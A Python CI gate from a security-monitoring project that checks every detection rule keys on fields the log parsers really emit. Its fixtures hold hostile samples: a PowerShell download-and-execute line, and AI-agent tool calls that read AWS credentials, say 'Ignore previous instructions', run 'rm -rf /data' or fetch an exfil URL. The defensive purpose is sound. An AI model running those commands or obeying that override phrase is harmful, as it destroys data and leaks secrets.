"""A6 (v0.3 plan): anti-dormancy guardrail.

A detection rule that filters/groups/distinct-counts on a field NO parser ever
emits can pass every unit test (synthetic fixtures include the field) yet never
fire on real data. This exact bug has shipped THREE times: the Windows-parser
src/dst conflation (fixed), the Cisco-ASA from/to endpoint gap (fixed), and
bank_db_priv_esc.yml referencing class 6005 with zero real producer (fixed in
v0.3 by the db_audit parser — see contracts/detection-coverage.md). This gate
now runs in CI so a fourth never ships silently.

This tool runs every registered parser against one REAL representative fixture,
collects the set of dotted field paths each parser's OUTPUT actually populates
(union across all parsers = "fields the pipeline can ever produce"), then checks
every rule's selections/group_by/distinct_field against that ground-truth set.
It does NOT check rule semantics (that's test_engine_*.py) -- only "does this
field path ever exist on a real event".

Run: python tools/check_rule_producers.py   (exit 0 = no dormant rules found)
Wired into run_all_tests.sh (v0.3).
"""
from __future__ import annotations

import sys
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parent.parent
SERVICES = ROOT / "services"
sys.path.insert(0, str(SERVICES / "ws2-normalization"))
sys.path.insert(0, str(SERVICES))

sys.path.insert(0, str(SERVICES / "ws4-detection"))
from engine import _CONDITION_TOKEN_RE, _parse_or  # noqa: E402  -- the engine's own condition grammar
from parsers import _REGISTRY  # noqa: E402
from enrichment import enrich  # noqa: E402  -- v0.4: mirror the real parse->enrich pipeline

RULES_DIR = ROOT / "contracts" / "rules"

def _real_fixtures(name: str, kind) -> list[dict]:
    """One REAL sensor record per kind (first of each), loaded from the parser's capture-derived fixture file so the
    records live in exactly one place. `kind(item)` returns a hashable key, or None to skip a record the parser drops."""
    import json
    items = json.loads((SERVICES / "ws2-normalization" / "parsers" / "test_fixtures" / name).read_text(encoding="utf-8"))["records"]
    seen: dict = {}
    for it in items:
        k = kind(it)
        if k is not None and k not in seen:
            seen[k] = {"raw": it["record"], "meta": {}}
    return list(seen.values())


def _suricata_kind(it):
    r = it["record"]
    et = r.get("event_type")
    if et not in ("alert", "flow", "dns", "modbus", "dnp3"):
        return None
    return (et, (r.get("dns") or r.get("dnp3") or {}).get("type"), r.get("app_proto") if et == "alert" else None)


def _zeek_kind(it):
    return None if it["log"] == "capture_loss.log" else (it["log"], it["record"].get("func"))


def _derived_fixture(name: str, pick, **changes) -> dict:
    """A DERIVED sensor record: the first real record of `name` that `pick(record)` accepts, deep-copied, with the
    dotted-path `changes` applied (e.g. ``**{"alert.severity": 1}``; a flat key that literally contains dots is set as-is).
    Used where the real capture lacks the value a rule
    keys on (a severity-1 signature, a 1 GiB flow, a DNP3 write): the record keeps the real sensor's field layout and only
    the named values differ. Every use is labelled "derived" at its FIXTURES entry; a derived record proves the rule is
    satisfiable by the parser's real output SHAPE, not that the sensor produced that value on a real capture."""
    import copy
    import json
    items = json.loads((SERVICES / "ws2-normalization" / "parsers" / "test_fixtures" / name).read_text(encoding="utf-8"))["records"]
    rec = copy.deepcopy(next(i["record"] for i in items if pick(i)))
    for dotted, value in changes.items():
        if dotted in rec:  # Zeek's flat keys contain literal dots ("id.resp_h"); only EVE nests
            rec[dotted] = value
            continue
        node = rec
        parts = dotted.split(".")
        for part in parts[:-1]:
            node = node[part]
        node[parts[-1]] = value
    return {"raw": rec, "meta": {}}


# One real, representative raw payload per registered parser (source_type -> raw).
# Mirrors each parser's own test fixtures -- kept minimal, just enough to populate
# every field branch (e.g. windows_eventlog needs one raw per handled EventID).
FIXTURES: dict[str, list[dict]] = {
    "linux_ssh": [
        {"raw": "Jun 10 13:55:36 db01 sshd[2154]: Failed password for invalid user "
                "admin from 203.0.113.5 port 51000 ssh2", "meta": {}},
        {"raw": "Jun 10 13:55:40 db01 sshd[2160]: Accepted publickey for deploy "
                "from 10.0.0.6 port 50022 ssh2", "meta": {}},
    ],
    "cisco_asa": [
        {"raw": "%ASA-4-106023: Deny tcp src outside:203.0.113.5/51000 "
                "dst inside:10.0.0.10/22 by access-group acl_out", "meta": {}},
        {"raw": "%ASA-6-302013: Built outbound TCP connection 1 for "
                "outside:203.0.113.5/51000 (203.0.113.5/51000) to "
                "inside:10.0.0.10/22 (10.0.0.10/22)", "meta": {}},
    ],
    "active_directory": [
        {"raw": {"EventID": 4624, "TimeCreated": 1750000000000,
                 "TargetUserName": "jdoe", "TargetDomainName": "BANKCORP",
                 "IpAddress": "10.20.30.40", "WorkstationName": "wks-jdoe"},
         "meta": {}},
        {"raw": {"EventID": 4625, "TimeCreated": 1750000000000,
                 "TargetUserName": "jdoe", "TargetDomainName": "BANKCORP",
                 "IpAddress": "10.20.30.40", "WorkstationName": "wks-jdoe"},
         "meta": {}},
    ],
    "vmware_vsphere": [
        {"raw": {"operation": "VM.Delete", "vm": "prod-db-07",
                 "userName": "svc_orchestrator", "host": "vcenter-01",
                 "ipAddress": "172.16.5.9", "createdTime": 1750000100000},
         "meta": {}},
    ],
    "generic_syslog": [
        {"raw": "<131>Jun 10 13:55:36 host1 app[99]: disk error", "meta": {}},
    ],
    "windows_eventlog": [
        {"raw": {"EventID": 4104, "TimeCreated": 1750000006000, "Computer": "wks-jdoe",
                 "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"},
         "meta": {}},
        {"raw": {"EventID": 5136, "TimeCreated": 1750000007000, "Computer": "dc01", "SubjectUserName": "adm",
                 "ObjectDN": "CN=svc-sql,OU=Svc,DC=corp,DC=example", "ObjectClass": "user",
                 "AttributeLDAPDisplayName": "servicePrincipalName", "AttributeValue": "MSSQLSvc/x:1433",
                 "OperationType": "%%14674"}, "meta": {}},
        {"raw": {"EventID": 7045, "TimeCreated": 1750000003000, "Computer": "wks-jdoe",
                 "SubjectUserName": "jdoe", "ServiceName": "UpdSvc",
                 "ImagePath": r"C:\Users\jdoe\AppData\Local\Temp\upd.exe"}, "meta": {}},
        {"raw": {"EventID": 1102, "TimeCreated": 1750000004000, "Computer": "dc01",
                 "SubjectUserName": "Administrator", "SubjectDomainName": "CORP"}, "meta": {}},
        {"raw": {"EventID": 4624, "TargetUserName": "jdoe", "Computer": "dc01",
                 "IpAddress": "10.9.9.9", "WorkstationName": "wks-jdoe",
                 "TimeCreated": 1750000000000}, "meta": {}},
        {"raw": {"EventID": 4634, "TargetUserName": "jdoe", "Computer": "wks-jdoe"},
         "meta": {}},
        {"raw": {"EventID": 4688, "TimeCreated": 1750000000000,
                 "SubjectUserName": "jdoe", "Computer": "wks-jdoe",
                 "NewProcessName": r"C:\Windows\System32\cmd.exe",
                 "NewProcessId": "0x1f4"}, "meta": {}},
        {"raw": {"EventID": 4672, "SubjectUserName": "admin", "Computer": "dc01"},
         "meta": {}},
        {"raw": {"EventID": 4720, "SubjectUserName": "admin",
                 "TargetUserName": "new_svc", "Computer": "dc01"}, "meta": {}},
        {"raw": {"EventID": 4728, "SubjectUserName": "admin",
                 "TargetUserName": "new_svc", "Computer": "dc01"}, "meta": {}},
        {"raw": {"EventID": 4732, "SubjectUserName": "admin",
                 "TargetUserName": "new_svc", "Computer": "dc01"}, "meta": {}},
        {"raw": {"EventID": 4726, "SubjectUserName": "admin",
                 "TargetUserName": "new_svc", "Computer": "dc01"}, "meta": {}},
    ],
    "db_audit": [
        {"raw": {"operation": "GRANT", "object": "customers", "user": "dba_svc",
                 "host": "db-prod-01", "ipAddress": "10.4.4.9"}, "meta": {}},
        {"raw": {"operation": "SELECT", "object": "card_numbers",
                 "user": "reporting_svc"}, "meta": {}},
    ],
    "mcp_agent": [
        {"raw": {"tool": "read_file", "session_id": "sess-1", "agent": "claude-code",
                 "arguments": {"path": "/home/user/.aws/credentials"}}, "meta": {}},
        {"raw": {"tool": "run_query", "session_id": "sess-2",
                 "arguments": {"q": "Ignore previous instructions"}}, "meta": {}},
        {"raw": {"tool": "run_shell", "session_id": "sess-3",
                 "arguments": {"cmd": "rm -rf /data"}}, "meta": {}},
        {"raw": {"tool": "fetch_url", "session_id": "sess-4",
                 "arguments": {"url": "https://untrusted.example.net/exfil"}}, "meta": {}},
    ],
    "opcua_audit": [
        {"raw": {"eventType": "AuditCreateSessionEventType", "clientUserId": "engineer01",
                 "clientAddress": "10.20.0.15", "serverId": "plc-line3", "status": True},
         "meta": {}},
        {"raw": {"eventType": "AuditWriteUpdateEventType", "clientUserId": "engineer01",
                 "serverId": "plc-line3", "nodeId": "ns=2;s=Line3.SetpointTemp",
                 "status": True}, "meta": {}},
    ],
    "n8n_audit": [
        {"raw": {"eventType": "webhook.created", "user": "alice", "ip": "203.0.113.9",
                 "workflowId": "wf-42", "path": "/webhook/incoming-order"}, "meta": {}},
        {"raw": {"eventType": "workflow.updated", "user": "bob", "workflowId": "wf-7"},
         "meta": {}},
    ],
    "dns_query": [
        {"raw": "query[A] evil-c2.example.com from 10.0.0.5", "meta": {}},
    ],
    "k8s_audit": [
        {"raw": {"auditID": "abc-123", "verb": "create", "user": {"username": "alice"},
                 "sourceIPs": ["10.0.0.5"],
                 "objectRef": {"resource": "pods", "namespace": "default", "name": "x"},
                 "requestObject": {"spec": {"securityContext": {"privileged": True}}},
                 "responseStatus": {"code": 201}}, "meta": {}},
    ],
    "cef": [
        {"raw": "CEF:0|Acme|Firewall|1.0|100|Auth failure|5|"
                "suser=admin src=203.0.113.5 spt=51000 outcome=failure", "meta": {}},
    ],
    "cloudtrail": [
        {"raw": {"eventTime": "2026-07-20T10:00:00Z", "eventSource": "signin.amazonaws.com",
                 "eventName": "ConsoleLogin", "sourceIPAddress": "203.0.113.9",
                 "userIdentity": {"type": "Root", "arn": "arn:aws:iam::123456789012:root"},
                 "responseElements": {"ConsoleLogin": "Success"},
                 "additionalEventData": {"MFAUsed": "No"}}, "meta": {}},
    ],
    "modbus_anomaly": [
        {"raw": {"unitId": 1, "functionCode": 3, "address": 40001,
                 "sourceIp": "10.20.0.50", "destIp": "10.20.0.5"}, "meta": {}},
        {"raw": {"unitId": 1, "functionCode": 6, "address": 41999,
                 "sourceIp": "10.20.0.99", "destIp": "10.20.0.5"}, "meta": {}},
        # Same out-of-range write, WITH a changeTicketId -- the producer
        # fixture for ot_modbus_unauthorized_write_ticketed.yml (the LOW
        # rule the write downgrades to instead of the HIGH one above).
        # Trust boundary (PR #80 review): the ticket rides the envelope's
        # META channel, never the frame record -- a changeTicketId in the
        # frame bytes is attacker data and must not downgrade.
        {"raw": {"unitId": 1, "functionCode": 6, "address": 41999,
                 "sourceIp": "10.20.0.99", "destIp": "10.20.0.5"},
         "meta": {"changeTicketId": "CHG-FIXTURE-0001"}},
    ],
    # WP-1.5: real Suricata 8 / Zeek 9 output on public pcaps (see the fixture-file headers).
    "suricata_eve": _real_fixtures("suricata_eve_real.json", _suricata_kind) + [
        # REAL capture record (no value changed -- _derived_fixture is only the loader here), kept explicitly because
        # _suricata_kind keeps only the first modbus record (a READ): the WrSingleCoil (function 5) request/response from
        # the real modbus.pcap run -> ot_write_unlisted_source.
        _derived_fixture("suricata_eve_real.json", lambda i: i["record"].get("event_type") == "modbus"
                         and (i["record"]["modbus"].get("request") or {}).get("function_raw") == 5),
        # DERIVED (the real capture holds only severity-3 alerts, from the three rules written for the fixture): the real
        # dns alert record with alert.severity set to 1 -> common_ids_high_severity_alert.
        _derived_fixture("suricata_eve_real.json", lambda i: i["record"].get("event_type") == "alert", **{"alert.severity": 1}),
        # DERIVED (the real DNP3 capture holds ENABLE_UNSOLICITED / READ only): the real DNP3 request with application
        # function_code 2 (WRITE) -> ot_write_unlisted_source.
        _derived_fixture("suricata_eve_real.json", lambda i: i["record"].get("event_type") == "dnp3",
                         **{"dnp3.application.function_code": 2}),
        # DERIVED (the real flows are tiny): the real modbus flow record from a public initiator to a documentation-range
        # destination with 1.2 GB sent -> common_large_outbound_flow.
        _derived_fixture("suricata_eve_real.json", lambda i: i["record"].get("event_type") == "flow"
                         and i["record"].get("app_proto") == "modbus",
                         dest_ip="198.51.100.20", **{"flow.bytes_toserver": 1_200_000_000}),
    ],
    "zeek_json": _real_fixtures("zeek_json_real.json", _zeek_kind) + [
        # common_refused_connection_scan reads conn_state S0/REJ. The real capture fixture holds only SF rows, so these two are
        # the real SF tcp conn row with conn_state/history/packet counts set to what a scan probe produces (Zeek 9.0.1 rows).
        {"raw": {"ts": 1093521678.945447, "uid": "CX1zbp3RCndHVDisa9", "id.orig_h": "10.0.0.57", "id.orig_p": 2387,
                 "id.resp_h": "10.0.0.3", "id.resp_p": 9999, "proto": "tcp", "duration": 0.0, "conn_state": st,
                 "history": hist, "orig_pkts": 1, "resp_pkts": rp, "missed_bytes": 0, "local_orig": True,
                 "local_resp": True}, "meta": {}}
        for st, hist, rp in (("S0", "S", 0), ("REJ", "Sr", 1))] + [
        # DERIVED (the real conn rows are tiny): the real modbus conn row to a documentation-range responder with 1.2 GB
        # originated -> common_large_outbound_flow.
        _derived_fixture("zeek_json_real.json", lambda i: i["log"] == "conn.log" and i["record"].get("service") == "modbus",
                         **{"id.resp_h": "198.51.100.20", "orig_bytes": 1_200_000_000}),
    ],
    "inventory_diff": [
        {"raw": {"mac": "AA:BB:CC:DD:EE:FF", "ip": "10.20.0.77",
                 "hostname": "plc-line4", "device_type": "plc",
                 "sector": "ot", "seen_at": 1751500000000}, "meta": {}},
    ],
    # Gap-hunt finding (2026-08-23): sysmon shipped 2026-07-22 and was never
    # added here -- collect_producible()'s own missing-fixture check would
    # have caught this on day one, but nothing called collect_producible()
    # (see main()/collect_events() below), so it silently sat unchecked for
    # a month despite this file's own docstring claiming to check "every
    # registered parser". Mirrors parsers/test_sysmon.py's fixtures.
    "sysmon": [
        {"raw": {"EventID": 1, "TimeCreated": 1750000006000, "Computer": "wks-jdoe",
                 "Image": r"C:\Windows\System32\cmd.exe", "CommandLine": "cmd /c whoami",
                 "ProcessId": "1235", "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                 "User": "CORP\\jdoe"}, "meta": {}},
        {"raw": {"EventID": 10, "TimeCreated": 1750000005000, "Computer": "wks-jdoe",
                 "SourceImage": r"C:\Users\jdoe\Downloads\dump.exe", "SourceProcessId": "4242",
                 "TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1010"}, "meta": {}},
        {"raw": {"EventID": 1, "TimeCreated": 1750000000000, "Computer": "wks-jdoe",
                 "Image": r"C:\Windows\System32\cmd.exe", "CommandLine": "cmd /c whoami",
                 "ProcessId": "1234", "ParentImage": r"C:\Windows\explorer.exe",
                 "ParentProcessId": "800", "User": "CORP\\jdoe",
                 "Hashes": "SHA256=ABCDEF0123456789"}, "meta": {}},
        {"raw": {"EventID": 3, "TimeCreated": 1750000001000, "Computer": "wks-jdoe",
                 "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                 "User": "CORP\\jdoe",
                 "SourceIp": "10.0.1.15", "SourcePort": "51000", "SourceHostname": "wks-jdoe",
                 "DestinationIp": "203.0.113.9", "DestinationPort": "443",
                 "DestinationHostname": "evil.example"}, "meta": {}},
        {"raw": {"EventID": 11, "TimeCreated": 1750000002000, "Computer": "wks-jdoe",
                 "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                 "TargetFilename": r"C:\Users\jdoe\AppData\Local\Temp\payload.exe",
                 "User": "CORP\\jdoe"}, "meta": {}},
    ],
    "mail_gateway": [
        {"raw": {"from": "billing@vendor.example.invalid", "to": "jdoe@corp.example",
                 "subject": "Invoice", "attachment": "Invoice.docm", "verdict": "delivered",
                 "ts": 1750000000000, "src_ip": "203.0.113.200"}, "meta": {}},
        {"raw": {"from": "a@corp.example", "to": "b@x.example", "direction": "outbound",
                 "verdict": "quarantined", "ts": 1750000001000}, "meta": {}},
    ],
    "m365_audit": [
        {"raw": {"Operation": "New-InboxRule", "Workload": "Exchange", "UserId": "jdoe@corp.example",
                 "ClientIP": "203.0.113.51:50432", "CreationTime": "2026-07-20T10:00:00Z",
                 "Parameters": [{"Name": "ForwardTo", "Value": "x@evil.example"},
                                {"Name": "DeleteMessage", "Value": "True"}]}, "meta": {}},
        {"raw": {"Operation": "UserLoginFailed", "Workload": "AzureActiveDirectory",
                 "UserId": "jdoe@corp.example", "ClientIP": "203.0.113.52",
                 "CreationTime": "2026-07-20T10:00:01Z"}, "meta": {}},
    ],
}


def flatten(doc, prefix: str = "") -> dict[str, object]:
    """dotted-path -> value for every leaf (and every intermediate dict path, so
    group_by/distinct_field on a container-shaped path still resolves) in a nested
    dict. Lists are not indexed -- a rule can only address dict paths, per
    engine.py's get_path."""
    out: dict[str, object] = {}
    if isinstance(doc, dict):
        for k, v in doc.items():
            p = f"{prefix}.{k}" if prefix else k
            out[p] = v
            out.update(flatten(v, p))
    return out


def rule_referenced(rule: dict) -> tuple[set[tuple[str, object]], set[str]]:
    """(equality (path,value) pairs required, path-only fields required).

    Operator-shaped selection values ({gt: 60}, {not_in: name},
    {outside_hours: {...}}) are dicts: unhashable as equality pairs and not
    equality semantics anyway -- for this tool they only require that the PATH
    is ever populated (whether the operator can be satisfied is rule semantics,
    out of scope here)."""
    equality: set[tuple[str, object]] = set()
    path_only: set[str] = set()
    for sel in (rule.get("detection") or {}).values():
        if isinstance(sel, dict):
            for k, v in sel.items():
                if isinstance(v, (dict, list)):
                    path_only.add(k)
                else:
                    equality.add((k, v))
    siem = rule.get("siem") or {}
    if siem.get("group_by"):
        path_only.add(siem["group_by"])
    if siem.get("distinct_field"):
        path_only.add(siem["distinct_field"])
    return equality, path_only


def rule_alternatives(rule: dict) -> list[tuple[set[tuple[str, object]], set[str]]]:
    """Every way the rule's `condition` can be TRUE, as (equality pairs, path-only fields) per way.

    `rule_referenced` unions the equality pairs of ALL selections, which is exact for a condition that is one conjunction
    (every shipped rule before 2026-11-20) but wrong for `a or b` (two protocols' equality pairs can never hold on one
    event) and for `not x` (a negated selection must NOT match, yet its pairs were demanded). Here each truth assignment
    of the selections that satisfies the condition (evaluated with the engine's own parser) contributes the pairs and
    paths of the selections it sets true, plus group_by/distinct_field; a rule is satisfiable if ANY alternative is. A
    one-conjunction rule yields exactly one alternative, identical to `rule_referenced`. An unparseable condition, or
    more than 10 selections, falls back to the old union (never looser than before for those)."""
    det = rule.get("detection") or {}
    names = [k for k, v in det.items() if k != "condition" and isinstance(v, dict)]
    per_sel = {n: rule_referenced({"detection": {n: det[n]}}) for n in names}
    siem = rule.get("siem") or {}
    extra = {siem[k] for k in ("group_by", "distinct_field") if siem.get(k)}
    cond = det.get("condition")
    union = rule_referenced(rule)
    if not isinstance(cond, str) or not names or len(names) > 10:
        return [union]
    tokens = _CONDITION_TOKEN_RE.findall(cond)
    alts: list[tuple[set, set]] = []
    for mask in range(1 << len(names)):
        truth = {n: bool(mask >> i & 1) for i, n in enumerate(names)}
        try:
            value, end = _parse_or(tokens, 0, truth)
        except (ValueError, IndexError, RecursionError, KeyError):
            return [union]
        if end != len(tokens):
            return [union]
        if value:
            eq: set = set()
            po: set = set(extra)
            for n in names:
                if truth[n]:
                    eq |= per_sel[n][0]
                    po |= per_sel[n][1]
            alts.append((eq, po))
    return alts or [union]


def collect_events() -> tuple[list[dict[str, object]], list[tuple[str, int]]]:
    """(one flattened dotted-path map per REAL event a parser produces
    (post-enrich), fixtures that parsed to None).

    Per-event (not a global union) so we can check that a rule matches and has its
    group_by/distinct_field on the SAME event -- see main().

    The second element is the gap-hunt fix (2026-08-26): a fixture whose parser
    returns None used to be silently dropped here, so the 'has fixture' coverage
    claim kept passing while that fixture contributed NOTHING to the field set
    -- the same false-coverage class as a missing FIXTURES entry, just quieter.
    Callers must treat it as a missing fixture (main() fails the gate on it)."""
    events: list[dict[str, object]] = []
    dropped: list[tuple[str, int]] = []
    for source_type, raws in FIXTURES.items():
        parser = _REGISTRY.get(source_type)
        if parser is None:
            continue
        for i, raw in enumerate(raws):
            event = parser.parse({"source_type": source_type, **raw})
            if event is None:
                dropped.append((source_type, i))
            else:
                events.append(flatten(enrich(event)))
    return events, dropped


def _event_matches(event: dict, equality: set) -> bool:
    """True if the event satisfies every equality (path,value) the rule requires."""
    return all(event.get(k) == v for k, v in equality)


def main() -> int:
    # Gap-hunt finding (2026-08-26): this was previously only checked inside
    # collect_producible(), which main() never called -- a registered parser
    # with no FIXTURES entry (sysmon, for a month) sat completely unchecked,
    # print("[OK] ...") and all, contradicting this file's own docstring
    # ("runs every registered parser"). A missing fixture isn't a soft NOTE:
    # it means this gate's coverage claim is false for that parser's fields,
    # so it fails the gate now instead of relying on someone reading stderr.
    #
    # Scope fix (2026-08-26): the check applies to BUILT-IN parsers only. A
    # third-party parser plugin registered via a `fengarde.parsers` entry
    # point (docs/plugin-development.md) is not this repo's parser -- this
    # gate cannot hold fixtures for packages it doesn't own, and failing the
    # repo's own CI because someone pip-installed a plugin would be a false
    # accusation. Built-ins are identified by their module (this package:
    # `parsers.<name>` a plugin lives in its own package, e.g.
    # `my_fengarde_plugin.parser`). Plugins are skipped with a note, never
    # silently: the note is what keeps the coverage claim honest.
    builtin = {st for st, p in _REGISTRY.items()
               if (getattr(p, "__module__", "") or "").startswith("parsers.")}
    plugins = sorted(set(_REGISTRY) - builtin)
    if plugins:
        print(f"[NOTE] third-party parser plugin(s) {plugins} are NOT covered by "
              f"this gate -- it checks built-in parsers only (this repo cannot "
              f"hold fixtures for external packages). Their fields are not in "
              f"the producibility ground truth below.")
    missing = sorted(builtin - set(FIXTURES))
    if missing:
        print(f"[FAIL] no FIXTURES entry for registered parser(s) {missing} -- "
              f"their fields are NOT checked by this gate. Add a fixture "
              f"(mirror that parser's own test file) before this can pass.")
        return 1
    stale = sorted(set(FIXTURES) - set(_REGISTRY))
    if stale:
        print(f"[FAIL] FIXTURES entry for unregistered source_type(s) {stale} -- "
              f"a removed/renamed parser left a stale fixture behind.")
        return 1

    events, dropped = collect_events()
    # Gap-hunt finding (2026-08-26): a fixture that parses to None contributes
    # zero fields to the ground truth but used to vanish silently from the
    # 'has fixture' accounting, leaving a false coverage claim for its
    # parser's fields. Same class as a missing FIXTURES entry: fail the gate.
    if dropped:
        print(f"[FAIL] fixture(s) parsed to None instead of producing an event: "
              f"{[f'{st}[{i}]' for st, i in dropped]} -- those fields are NOT in "
              f"the ground truth, so any rule relying on them would look "
              f"satisfiable while never firing. Fix the fixture (mirror the "
              f"parser's own test input) before this can pass.")
        return 1
    # Global sets, kept only to write precise diagnostics.
    all_paths: set[str] = set()
    all_pairs: set = set()
    for e in events:
        all_paths |= set(e)
        all_pairs |= {(k, v) for k, v in e.items()
                      if isinstance(v, (str, int, float, bool)) or v is None}

    dormant: list[tuple[str, list[str]]] = []
    for path in sorted(RULES_DIR.glob("*.yml")):
        rule = yaml.safe_load(path.read_text(encoding="utf-8"))
        if not rule:
            continue
        # P2.7: satisfiability is PER EVENT. A rule fires on events matching its
        # equality selection; for a stateful rule it must ALSO have group_by/
        # distinct_field present on those same events, or it can never count. The
        # old global-union check missed this: it passed a rule whose group/distinct
        # field is only ever produced by a DIFFERENT class than the rule matches.
        # 2026-11-20: per way the condition can be true (rule_alternatives), so `or`/`not`
        # conditions are judged on the selections that must actually hold together.
        alternatives = rule_alternatives(rule)
        satisfied = False
        for equality, path_only in alternatives:
            matching = [e for e in events if _event_matches(e, equality)]
            if any(all(f in e for f in path_only) for e in matching):
                satisfied = True
                break
        if satisfied:
            continue
        # Diagnostics describe the alternative that got furthest (most events matching its equality pairs).
        equality, path_only = max(alternatives, key=lambda a: sum(_event_matches(e, a[0]) for e in events))
        matching = [e for e in events if _event_matches(e, equality)]

        # Build a precise reason.
        problems = [f"{k}={v!r} never produced by any parser" for k, v in equality
                    if (k, v) not in all_pairs]
        problems += [f"{f} path never populated by any parser" for f in path_only
                     if f not in all_paths]
        if not problems:
            # Every piece is producible in isolation, but not TOGETHER on one event.
            if not matching:
                problems.append("no real event matches this rule's equality "
                                "selection (values produced, but never together)")
            else:
                miss = sorted({f for f in path_only
                               if not any(f in e for e in matching)})
                problems.append(
                    f"events matching this rule never carry {miss} "
                    f"(group_by/distinct_field on a field the matched class "
                    f"doesn't emit -- rule would silently never count)")
        dormant.append((rule.get("title", path.name), problems))

    if dormant:
        print("[FAIL] rules that can NEVER fire on real data (no single real event "
              "both matches the rule AND carries the fields it needs to count):")
        for title, problems in dormant:
            print(f"  - {title!r}:")
            for p in problems:
                print(f"      {p}")
        return 1

    # Non-zero floor. Every check above is vacuously true over an empty rule
    # set, and the event-side numbers below stay large and convincing while
    # zero rules were actually examined -- pointed at an empty RULES_DIR this
    # printed "[OK] all 0 rules are satisfiable ... (32 events, 83 paths, 297
    # (path,value) pairs checked)" and exited 0. Same blind spot as
    # eval/attack/fire_check.py's, and the same one-line fix.
    checked = len(list(RULES_DIR.glob("*.yml")))
    if not checked:
        print(f"[FAIL] ZERO rule files were checked in {RULES_DIR} -- the anti-dormancy "
              f"gate passed without examining a single rule. Every check above is "
              f"vacuously true over an empty set; the event-side counts below say "
              f"nothing about rule coverage.")
        return 1

    print(f"[OK] all {checked} rules are satisfiable by a "
          f"real event that both matches them and carries their group/distinct "
          f"fields ({len(events)} events, {len(all_paths)} paths, "
          f"{len(all_pairs)} (path,value) pairs checked)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
